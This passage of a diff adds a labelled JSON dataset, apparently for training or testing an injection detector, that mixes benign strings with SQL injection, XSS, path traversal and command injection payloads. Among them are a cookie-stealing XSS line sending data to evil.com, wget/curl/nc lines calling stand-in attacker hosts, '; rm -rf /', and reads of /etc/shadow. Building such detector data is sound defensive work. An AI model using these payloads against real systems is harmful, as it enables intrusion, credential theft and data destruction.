+    },
+    {
+      "text": "/category/tech",
+      "label": "clean"
+    },
+    {
+      "text": "DROP TABLE users",
+      "label": "sqli"
+    },
+    {
+      "text": "technology",
+      "label": "clean"
+    },
+    {
+      "text": "BTC",
+      "label": "clean"
+    },
+    {
+      "text": "my.name@domain.com",
+      "label": "clean"
+    },
+    {
+      "text": "onload=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "' or 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "' OR 'x'='x",
+      "label": "sqli"
+    },
+    {
+      "text": "<embed src=javascript:alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "%2e%2e%2f%2e%2e%2f",
+      "label": "path_traversal"
+    },
+    {
+      "text": "..%252fetc%252fpasswd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "' FROM information_schema.tables",
+      "label": "sqli"
+    },
+    {
+      "text": "select * from information_schema",
+      "label": "sqli"
+    },
+    {
+      "text": "admin'or'1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "+1 555-123-4567",
+      "label": "clean"
+    },
+    {
+      "text": "root",
+      "label": "clean"
+    },
+    {
+      "text": "onmouseover=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "<a href=javascript:alert(1)>XSS</a>",
+      "label": "xss"
+    },
+    {
+      "text": "test123",
+      "label": "clean"
+    },
+    {
+      "text": "/root/.ssh/id_rsa",
+      "label": "path_traversal"
+    },
+    {
+      "text": "photo.png",
+      "label": "clean"
+    },
+    {
+      "text": "<div onclick=alert(1)>click</div>",
+      "label": "xss"
+    },
+    {
+      "text": "superuser",
+      "label": "clean"
+    },
+    {
+      "text": "..\\windows\\system32\\drivers\\etc\\hosts",
+      "label": "path_traversal"
+    },
+    {
+      "text": "onerror=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+      "label": "xss"
+    },
+    {
+      "text": "boot.ini",
+      "label": "path_traversal"
+    },
+    {
+      "text": "TXN-ABC123",
+      "label": "clean"
+    },
+    {
+      "text": "<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>",
+      "label": "xss"
+    },
+    {
+      "text": "data_export.csv",
+      "label": "clean"
+    },
+    {
+      "text": "`rm -rf /tmp/test`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "michael",
+      "label": "clean"
+    },
+    {
+      "text": "/var/log/apache2/error.log",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/etc/crontab",
+      "label": "path_traversal"
+    },
+    {
+      "text": "%3bls",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "guest",
+      "label": "clean"
+    },
+    {
+      "text": "'; SELECT pg_sleep(5)--",
+      "label": "sqli"
+    },
+    {
+      "text": "administrator",
+      "label": "clean"
+    },
+    {
+      "text": "' OR 'a'='a",
+      "label": "sqli"
+    },
+    {
+      "text": "mypassword123",
+      "label": "clean"
+    },
+    {
+      "text": "<marquee onstart=alert(1)>text</marquee>",
+      "label": "xss"
+    },
+    {
+      "text": "The product is very good, I recommend it.",
+      "label": "clean"
+    },
+    {
+      "text": "; id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "release-2024",
+      "label": "clean"
+    },
+    {
+      "text": "' -- -",
+      "label": "sqli"
+    },
+    {
+      "text": "&& ls -la /",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "letmein",
+      "label": "clean"
+    },
+    {
+      "text": "' UNION SELECT column_name,NULL FROM information_schema.columns--",
+      "label": "sqli"
+    },
+    {
+      "text": "' UNION SELECT @@version,NULL--",
+      "label": "sqli"
+    },
+    {
+      "text": "; ls -la",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../var/log/apache2/access.log",
+      "label": "path_traversal"
+    },
+    {
+      "text": "INV-2024-001",
+      "label": "clean"
+    },
+    {
+      "text": "' OR a=a",
+      "label": "sqli"
+    },
+    {
+      "text": "alert('test')",
+      "label": "xss"
+    },
+    {
+      "text": "margin: 0 auto;",
+      "label": "clean"
+    },
+    {
+      "text": "`whoami`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "demo",
+      "label": "clean"
+    },
+    {
+      "text": "& wget http://evil.com",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "3*1 OR 1=1",
+      "label": "sqli"
+    },
+    {
+      "text": "testuser",
+      "label": "clean"
+    },
+    {
+      "text": "1 or 1=1",
+      "label": "sqli"
+    },
+    {
+      "text": "&& nc evil.com 4444",
+      "label": "cmd_injection"
+    },
+    {
+      "text": ")) OR 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "../../.htaccess",
+      "label": "path_traversal"
+    },
+    {
+      "text": "../../.env",
+      "label": "path_traversal"
+    },
+    {
+      "text": "C:\\windows\\system32\\cmd.exe",
+      "label": "path_traversal"
+    },
+    {
+      "text": "' AND LENGTH(password)>5--",
+      "label": "sqli"
+    },
+    {
+      "text": "<script>alert(0)</script>",
+      "label": "xss"
+    },
+    {
+      "text": "../proc/version",
+      "label": "path_traversal"
+    },
+    {
+      "text": "01/15/2024",
+      "label": "clean"
+    },
+    {
+      "text": "%2527 OR 1=1",
+      "label": "sqli"
+    },
+    {
+      "text": "LOAD_FILE('/etc/shadow')",
+      "label": "sqli"
+    },
+    {
+      "text": "..%c1%9c",
+      "label": "path_traversal"
+    },
+    {
+      "text": "') OR ''='",
+      "label": "sqli"
+    },
+    {
+      "text": "const x = 10;",
+      "label": "clean"
+    },
+    {
+      "text": "test$(whoami)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "support@example.org",
+      "label": "clean"
+    },
+    {
+      "text": "Can you help me with this problem?",
+      "label": "clean"
+    },
+    {
+      "text": "' ORDER BY 1--",
+      "label": "sqli"
+    },
+    {
+      "text": "shadow",
+      "label": "clean"
+    },
+    {
+      "text": "..\\windows\\win.ini",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/windows/system32",
+      "label": "path_traversal"
+    },
+    {
+      "text": "false",
+      "label": "clean"
+    },
+    {
+      "text": "$(hostname)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "Item added to cart.",
+      "label": "clean"
+    },
+    {
+      "text": "../../proc/version",
+      "label": "path_traversal"
+    },
+    {
+      "text": "\ncat /etc/passwd",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../../",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<div onmouseup=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "<img/src=x onerror=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "999",
+      "label": "clean"
+    },
+    {
+      "text": "SELECT table_name FROM information_schema.tables",
+      "label": "sqli"
+    },
+    {
+      "text": "{{7*7}}",
+      "label": "xss"
+    },
+    {
+      "text": "%3b%20whoami",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "1' AND '1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "1 | sleep 5",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "/home",
+      "label": "clean"
+    },
+    {
+      "text": "SELECT @@version",
+      "label": "sqli"
+    },
+    {
+      "text": "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "')) OR 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "..%2fetc%2fpasswd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
+      "label": "sqli"
+    },
+    {
+      "text": "I cannot login to my account.",
+      "label": "clean"
+    },
+    {
+      "text": "`cat /etc/passwd`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../../etc/passwd%00.jpg",
+      "label": "path_traversal"
+    },
+    {
+      "text": "Your verification code is 482910.",
+      "label": "clean"
+    },
+    {
+      "text": "| ls",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "Please reset my password.",
+      "label": "clean"
+    },
+    {
+      "text": "| awk '{print}' /etc/passwd",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "bob",
+      "label": "clean"
+    },
+    {
+      "text": "&& id && whoami",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "1' OR 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "EXECUTE sp_executesql",
+      "label": "sqli"
+    },
+    {
+      "text": "SELECT LOAD_FILE('/etc/shadow')",
+      "label": "sqli"
+    },
+    {
+      "text": "%3b+ls",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "batman",
+      "label": "clean"
+    },
+    {
+      "text": "report-2024.pdf",
+      "label": "clean"
+    },
+    {
+      "text": "..%2f",
+      "label": "path_traversal"
+    },
+    {
+      "text": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+      "label": "xss"
+    },
+    {
+      "text": "' OR/**/1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "&& whoami",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "1' AND SLEEP(5)--",
+      "label": "sqli"
+    },
+    {
+      "text": "SELECT database()",
+      "label": "sqli"
+    },
+    {
+      "text": "nodejs",
+      "label": "clean"
+    },
+    {
+      "text": "..%c0%af",
+      "label": "path_traversal"
+    },
+    {
+      "text": "';exec(0x78705f636d647368656c6c)--",
+      "label": "sqli"
+    },
+    {
+      "text": "react",
+      "label": "clean"
+    },
+    {
+      "text": "New York, NY 10001",
+      "label": "clean"
+    },
+    {
+      "text": "..%2fetc%5cpasswd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "(555) 987-6543",
+      "label": "clean"
+    },
+    {
+      "text": "/boot.ini",
+      "label": "path_traversal"
+    },
+    {
+      "text": "blood pressure normal range",
+      "label": "clean"
+    },
+    {
+      "text": "The quick brown fox jumps over the lazy dog.",
+      "label": "clean"
+    },
+    {
+      "text": "test",
+      "label": "clean"
+    },
+    {
+      "text": "video.mp4",
+      "label": "clean"
+    },
+    {
+      "text": "' UNION SELECT NULL,NULL--",
+      "label": "sqli"
+    },
+    {
+      "text": "alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "/proc/self/cmdline",
+      "label": "path_traversal"
+    },
+    {
+      "text": "1 OR 1=1#",
+      "label": "sqli"
+    },
+    {
+      "text": "<script>alert(1)</script>",
+      "label": "xss"
+    },
+    {
+      "text": "Order confirmed.",
+      "label": "clean"
+    },
+    {
+      "text": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+      "label": "sqli"
+    },
+    {
+      "text": "Welcome back!",
+      "label": "clean"
+    },
+    {
+      "text": "& ipconfig",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "' /*!UNION*/ /*!SELECT*/ NULL--",
+      "label": "sqli"
+    },
+    {
+      "text": "' or 1=1 LIMIT 1--",
+      "label": "sqli"
+    },
+    {
+      "text": "' FROM sys.tables--",
+      "label": "sqli"
+    },
+    {
+      "text": "%2e%2e%5cwindows%5csystem32",
+      "label": "path_traversal"
+    },
+    {
+      "text": "..%2f..%2f",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<div onfocus=alert(1) tabindex=0>",
+      "label": "xss"
+    },
+    {
+      "text": "ALTER TABLE users ADD COLUMN hack text",
+      "label": "sqli"
+    },
+    {
+      "text": "<script>console.log(document.cookie)</script>",
+      "label": "xss"
+    },
+    {
+      "text": "../../../../../../etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "../../../etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "label": "xss"
+    },
+    {
+      "text": "; netstat -an",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<textarea onkeypress=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "category=electronics",
+      "label": "clean"
+    },
+    {
+      "text": "'||1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "100 / 5 = 20",
+      "label": "clean"
+    },
+    {
+      "text": "background-color: #ffffff;",
+      "label": "clean"
+    },
+    {
+      "text": "user1",
+      "label": "clean"
+    },
+    {
+      "text": "; rm -rf /",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "offset=0",
+      "label": "clean"
+    },
+    {
+      "text": "pg_sleep(5)",
+      "label": "sqli"
+    },
+    {
+      "text": "'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--",
+      "label": "sqli"
+    },
+    {
+      "text": "../",
+      "label": "path_traversal"
+    },
+    {
+      "text": "brand=apple",
+      "label": "clean"
+    },
+    {
+      "text": "\nwget http://attacker.com",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<div ondblclick=alert(1)>click</div>",
+      "label": "xss"
+    },
+    {
+      "text": "'; DROP TABLE users--",
+      "label": "sqli"
+    },
+    {
+      "text": "setTimeout('alert(1)',0)",
+      "label": "xss"
+    },
+    {
+      "text": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "label": "xss"
+    },
+    {
+      "text": "business",
+      "label": "clean"
+    },
+    {
+      "text": "onerror=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "<script src=http://evil.com/xss.js></script>",
+      "label": "xss"
+    },
+    {
+      "text": "document.cookie",
+      "label": "xss"
+    },
+    {
+      "text": "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(1);\">",
+      "label": "xss"
+    },
+    {
+      "text": "/var/www/html/.env",
+      "label": "path_traversal"
+    },
+    {
+      "text": "'; SLEEP(5)--",
+      "label": "sqli"
+    },
+    {
+      "text": "john.doe@company.com",
+      "label": "clean"
+    },
+    {
+      "text": "v2.3.1",
+      "label": "clean"
+    },
+    {
+      "text": "<object data=javascript:alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "This is a normal comment without any malicious content.",
+      "label": "clean"
+    },
+    {
+      "text": "<script src=//evil.com>",
+      "label": "xss"
+    },
+    {
+      "text": "..\\..\\..\\windows\\system32",
+      "label": "path_traversal"
+    },
+    {
+      "text": "The service was excellent!",
+      "label": "clean"
+    },
+    {
+      "text": "John Doe",
+      "label": "clean"
+    },
+    {
+      "text": "UPDATE users SET password",
+      "label": "sqli"
+    },
+    {
+      "text": "alice_smith",
+      "label": "clean"
+    },
+    {
+      "text": "| bash",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "/home/user/.bash_history",
+      "label": "path_traversal"
+    },
+    {
+      "text": "backup_2024-01-01.zip",
+      "label": "clean"
+    },
+    {
+      "text": "<iframe/src=http://evil.com>",
+      "label": "xss"
+    },
+    {
+      "text": "& id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "\n ls",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "admin",
+      "label": "clean"
+    },
+    {
+      "text": "`uname -a`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "; cat /etc/hosts",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<script>alert('XSS')</script>",
+      "label": "xss"
+    },
+    {
+      "text": "../etc/passwd%00",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<details/open/ontoggle=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "| whoami",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "react vs vue vs angular",
+      "label": "clean"
+    },
+    {
+      "text": "' OR '1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "; wget http://attacker.com/shell",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "&& cat /etc/shadow",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "INSERT INTO users(username,password) VALUES('admin','admin')",
+      "label": "sqli"
+    },
+    {
+      "text": "<body onload=alert(document.domain)>",
+      "label": "xss"
+    },
+    {
+      "text": "LOAD_FILE('/etc/passwd')",
+      "label": "sqli"
+    },
+    {
+      "text": "<script>alert(location.hash.slice(1))</script>",
+      "label": "xss"
+    },
+    {
+      "text": "../../proc/self/environ",
+      "label": "path_traversal"
+    },
+    {
+      "text": "noreply@service.com",
+      "label": "clean"
+    },
+    {
+      "text": "| curl http://evil.com/payload",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "| id && cat /etc/shadow",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<svg><animate onbegin=alert(1) attributeName=x>",
+      "label": "xss"
+    },
+    {
+      "text": "' AND substring(version(),1,1)='5'--",
+      "label": "sqli"
+    },
+    {
+      "text": "<div style=\"background:url(javascript:alert(1))\">",
+      "label": "xss"
+    },
+    {
+      "text": "&& python3 -c 'import os;os.system(\"id\")'",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "qwerty",
+      "label": "clean"
+    },
+    {
+      "text": "&& cat /etc/passwd",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "' AND 1=1 AND '1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "<svg/onload=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "<iframe src=javascript:alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "42 Main Ave, Suite 100",
+      "label": "clean"
+    },
+    {
+      "text": "<ScRiPt>alert(1)</sCrIpT>",
+      "label": "xss"
+    },
+    {
+      "text": "vitamin d deficiency",
+      "label": "clean"
+    },
+    {
+      "text": "BENCHMARK(10000000,MD5(1))",
+      "label": "sqli"
+    },
+    {
+      "text": "..\\..\\windows\\system32",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/etc/cron.d/",
+      "label": "path_traversal"
+    },
+    {
+      "text": "eval('alert(1)')",
+      "label": "xss"
+    },
+    {
+      "text": "covid vaccine side effects",
+      "label": "clean"
+    },
+    {
+      "text": "C:\\windows\\win.ini",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<SCRIPT>alert(1)</SCRIPT>",
+      "label": "xss"
+    },
+    {
+      "text": "headache treatment",
+      "label": "clean"
+    },
+    {
+      "text": "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
+      "label": "xss"
+    },
+    {
+      "text": "{{constructor.constructor('alert(1)()')}}",
+      "label": "xss"
+    },
+    {
+      "text": "onclick=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "P@ssword1",
+      "label": "clean"
+    },
+    {
+      "text": "onmouseover=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "<img src=x onerror=%22alert(1)%22>",
+      "label": "xss"
+    },
+    {
+      "text": "%27%20OR%201%3D1--",
+      "label": "sqli"
+    },
+    {
+      "text": "<form onsubmit=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "typescript",
+      "label": "clean"
+    },
+    {
+      "text": "../../../.htpasswd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "%252e%252e%252f%252e%252e%252f",
+      "label": "path_traversal"
+    },
+    {
+      "text": "%7c+cat+%2fetc%2fpasswd",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "welcome",
+      "label": "clean"
+    },
+    {
+      "text": "<script>alert(1)</script>",
+      "label": "xss"
+    },
+    {
+      "text": "<input onblur=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "<div onkeydown=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "&& id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<body/onload=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "<script >alert(1)</script>",
+      "label": "xss"
+    },
+    {
+      "text": "SELECT username,password FROM users",
+      "label": "sqli"
+    },
+    {
+      "text": "<img src=1 onerror=alert(1)/>",
+      "label": "xss"
+    },
+    {
+      "text": "../../../../etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "pass123",
+      "label": "clean"
+    },
+    {
+      "text": "stable",
+      "label": "clean"
+    },
+    {
+      "text": "/etc/shadow",
+      "label": "path_traversal"
+    },
+    {
+      "text": "; node -e 'require(\"child_process\").exec(\"id\")'",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "UPDATE users SET role='admin' WHERE id=1",
+      "label": "sqli"
+    },
+    {
+      "text": "<Script>alert(1)</Script>",
+      "label": "xss"
+    },
+    {
+      "text": "<video onerror=alert(1)><source></video>",
+      "label": "xss"
+    },
+    {
+      "text": "<img src=x onerror=alert(0)>",
+      "label": "xss"
+    },
+    {
+      "text": "1 OR 1=1",
+      "label": "sqli"
+    },
+    {
+      "text": "<script>alert(document.cookie)</script>",
+      "label": "xss"
+    },
+    {
+      "text": "& dir",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "123 Baker Street",
+      "label": "clean"
+    },
+    {
+      "text": "EXEC xp_cmdshell",
+      "label": "sqli"
+    },
+    {
+      "text": "; sleep 10",
+      "label": "cmd_injection"
+    }
+  ]
+}
